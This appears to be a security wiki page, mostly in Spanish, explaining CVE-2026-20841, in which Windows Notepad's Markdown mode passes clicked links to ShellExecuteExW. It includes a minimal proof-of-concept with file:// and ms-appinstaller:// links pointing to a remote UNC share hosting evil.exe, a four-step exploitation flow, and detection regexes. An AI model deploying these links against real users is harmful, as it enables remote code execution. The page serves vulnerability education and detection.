# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Las aplicaciones modernas de Windows que renderizan Markdown/HTML suelen convertir los enlaces suministrados por el usuario en elementos clicables y se los pasan a `ShellExecuteExW`. Sin una lista de esquemas permitidos estricta, cualquier controlador de protocolo registrado (p. ej., `file:`, `ms-appinstaller:`) puede activarse, conduciendo a ejecución de código en el contexto del usuario actual.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad elige el modo Markdown **solo para extensiones `.md`** mediante una comparación de cadena fija en `sub_1400ED5D0()`.
- Enlaces Markdown soportados:
- Standard: `[text](target)`
- Autolink: `<target>` (renderizado como `[target](target)`), por lo que ambas sintaxis importan para payloads y detecciones.
- Los clics en enlaces se procesan en `sub_140170F60()`, que realiza un filtrado débil y luego llama a `ShellExecuteExW`.
- `ShellExecuteExW` despacha a **cualquier controlador de protocolo configurado**, no solo HTTP(S).

### Consideraciones sobre el payload
- Cualquier secuencia `\\` en el enlace se **normaliza a `\`** antes de `ShellExecuteExW`, lo que afecta la elaboración de rutas UNC/path y la detección.
- Los archivos `.md` **no están asociados con Notepad por defecto**; la víctima aún debe abrir el archivo en Notepad y hacer clic en el enlace, pero una vez renderizado, el enlace es clicable.
- Esquemas de ejemplo peligrosos:
- `file://` para lanzar un payload local/UNC.
- `ms-appinstaller://` para desencadenar los flujos de App Installer. Otros esquemas registrados localmente también pueden ser abusables.

### PoC Markdown mínimo
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flujo de explotación
1. Craft a **`.md` file** so Notepad renders it as Markdown.
2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
4. On click, the **normalized link** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.

## Ideas de detección
- Monitorear transferencias de `.md` files a través de puertos/protocolos que comúnmente entregan documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizar enlaces Markdown (estándar y autolink) y buscar **sin distinguir mayúsculas/minúsculas** `file:` o `ms-appinstaller:`.
- Expresiones regulares recomendadas por el proveedor para detectar acceso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Se informa que el parche **allowlists local files and HTTP(S)**; cualquier otra cosa que llegue a `ShellExecuteExW` es sospechosa. Extienda las detecciones a otros manejadores de protocolo instalados según sea necesario, ya que la superficie de ataque varía según el sistema.

## Referencias
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
